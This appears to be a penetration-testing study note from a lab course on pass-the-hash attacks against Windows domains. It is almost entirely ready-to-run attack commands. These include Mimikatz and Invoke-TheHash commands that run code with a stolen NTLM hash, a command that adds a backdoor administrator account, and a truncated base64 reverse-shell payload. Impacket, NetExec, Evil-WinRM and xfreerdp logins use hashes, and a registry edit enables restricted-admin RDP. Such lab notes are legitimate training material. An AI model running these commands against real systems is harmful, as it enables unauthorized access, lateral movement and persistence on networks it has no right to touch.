## Table of Contents:

### From Windows:
- [[#Mimikatz]]
- [[#[Invoke-TheHash](https //github.com/Kevin-Robertson/Invoke-TheHash)|Invoke-TheHash]]
### From Linux:
- [[#[Impacket](https //github.com/SecureAuthCorp/impacket)|Impacket]]
- [[#[NetExec](https //github.com/Pennyw0rth/NetExec)|NetExec]]
- [[#[Evil-WinRM](https //github.com/Hackplayers/evil-winrm)|Evil-WinRM]]
- [[#RDP]]

---

## Mimikatz

We need to use `sekurlsa::pth` for this.

```powershell
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

---
## [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

Collection of powershell functions for performing PtH. When using `Invoke-TheHash`, we have two options: SMB or WMI command execution.

```powershell
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1

PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlA...<SNIP>...AKAApAA=="
### Reverse Shell. base64 encoded
```

---

## [Impacket](https://github.com/SecureAuthCorp/impacket)

```shell
> psexec.py administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

> smbexec.py -share David -hashes :"c39f2beb3d2ec06a62cb887fb391dee0" "inlanefreight.htb"/"david"@"10.129.116.81"
```

Other tools that can be used: [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py), [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py),[impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py).

---

## [NetExec](https://github.com/Pennyw0rth/NetExec)

```shell
> nxc smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 

> nxc smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
  ### command execution
```

Use `--local-auth` to authenticate locally and not via Kerberos.

---

## [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)

```shell
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

Add domain name with domain account like: administrator@inlanefreight.htb

---

## RDP

```PowerShell
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
### enable DisableRestrictedAdmin Mode
```

Enabling `DisableRestrictedAdmin` mode is a must !!!

```shell
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
### Pass The Hash
```

---


